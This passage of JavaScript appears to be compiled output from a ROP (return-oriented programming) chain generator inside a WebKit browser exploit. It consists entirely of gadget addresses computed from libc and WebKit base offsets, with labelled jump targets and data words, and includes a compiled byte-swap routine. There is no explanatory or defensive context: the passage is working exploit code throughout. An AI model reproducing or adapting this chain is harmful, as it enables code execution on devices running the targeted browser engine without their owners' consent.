libc_base+793877, //pop rsi
ropchain+71704, //L145
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L145:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L147:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L148:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+71888, //L150
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L150:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+71944, //L151
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L151:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+72056, //L153
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L153:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L154:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+72160, //L156
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+72176, //L157
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L156:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L157:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+72328, //L159
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+72360, //L162
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+72344, //L160
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+72312, //L161
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L161:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L159:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L160:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L162:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+72456, //L164
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+72440, //L163
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L163:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L164:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L165:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L166:
db([24, 0]); // 0x18
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+72608, //L168
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L168:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+72664, //L169
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L169:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+72800, //L173
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+72768, //L172
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L172:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L171:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+72928, //L175
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+72944, //L176
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+72912, //L174
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L174:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L175:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73040, //L177
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73056, //L178
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L177:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73168, //L179
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73152, //L180
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L180:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+73256, //L182
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+73240, //L181
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L181:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73352, //L183
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73368, //L184
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L183:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73480, //L185
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+73464, //L186
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L186:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L185:
db([0, 0]); // 0x0
//___builtin_bswap64:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+73552, //L187
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L187:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+73616, //L189
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L189:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([16, 0]); // 0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+73712, //L193
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L192:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L193:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+73768, //L194
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L194:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L195:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L197:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L198:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+73904, //L201
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L200:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L201:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+73960, //L204
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L204:
db([0, 0]); // 0x0
//L202:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+74008, //L205
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L205:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L206:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+74112, //L208
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74128, //L209
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L208:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L209:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+74280, //L211
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74312, //L214
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74296, //L212
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+74264, //L213
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L213:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L211:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L212:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L214:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74384, //L215
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74400, //L216
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L215:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L216:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74496, //L218
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+74480, //L217
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L217:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L218:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74576, //L221
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L221:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L219:
db([4, 0]); // 0x4
set_gadget(libc_base+788575,); //pop rax
//L220:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+74728, //L223
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74744, //L224
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+74712, //L222
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L222:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L223:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L224:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+48555, //setl al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+74912, //L225
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+74928, //L227
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+74896, //L226
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L226:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L225:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L227:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+75032, //L231
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+75080, //L232
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+75048, //L229
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L231:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L229:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L230:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L232:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+75192, //L233+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+75184, //L233
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L233:
db([0, 0]); // 0x0
set_gadgets([
ropchain+75208, //L233+24
ropchain+75224, //L228
libc_base+811575, //pop rsp
ropchain+75240, //L234
//L228:
libc_base+811575, //pop rsp
ropchain+85632, //L235
//L234:
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L237:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L238:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+75360, //L239
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75376, //L240
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L239:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L240:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+75520, //L244
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+75488, //L242
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75504, //L243
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L242:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L243:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L244:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+75592, //L246
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L246:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+75648, //L247
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L247:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L249:
db([7, 0]); // 0x7
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+75776, //L250
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L250:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L251:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+75880, //L253
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+75896, //L254
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L253:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L254:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+76048, //L256
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76080, //L259
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76064, //L257
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+76032, //L258
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L258:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L256:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L257:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L259:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+76200, //L261
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76216, //L262
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+76184, //L260
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L260:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L261:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+76320, //L263
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76336, //L264
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L263:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+76424, //L266
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+76480, //L267
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L267:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+76600, //L269
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76632, //L271
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76616, //L270
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L269:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L270:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+76792, //L275
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+76760, //L272
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+76744, //L273
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L273:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L272:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L274:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L275:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+76848, //L276
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L276:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+76952, //L278
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+76984, //L280
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+76968, //L279
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L278:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L279:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L280:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77144, //L284
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77112, //L281
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+77096, //L282
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L282:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L281:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L283:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L284:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+77200, //L285
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+77304, //L287
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77336, //L289
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77320, //L288
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L287:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L288:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L289:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77496, //L293
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77464, //L290
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+77448, //L291
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L291:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L290:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L292:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L293:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+77552, //L294
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+77656, //L296
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77688, //L298
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77672, //L297
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L296:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L297:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L298:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77760, //L299
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+77776, //L300
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L299:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+77880, //L302
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+77864, //L301
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L301:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L302:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L303:
db([4294967283, 4294967295]); // -0xd
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L305:
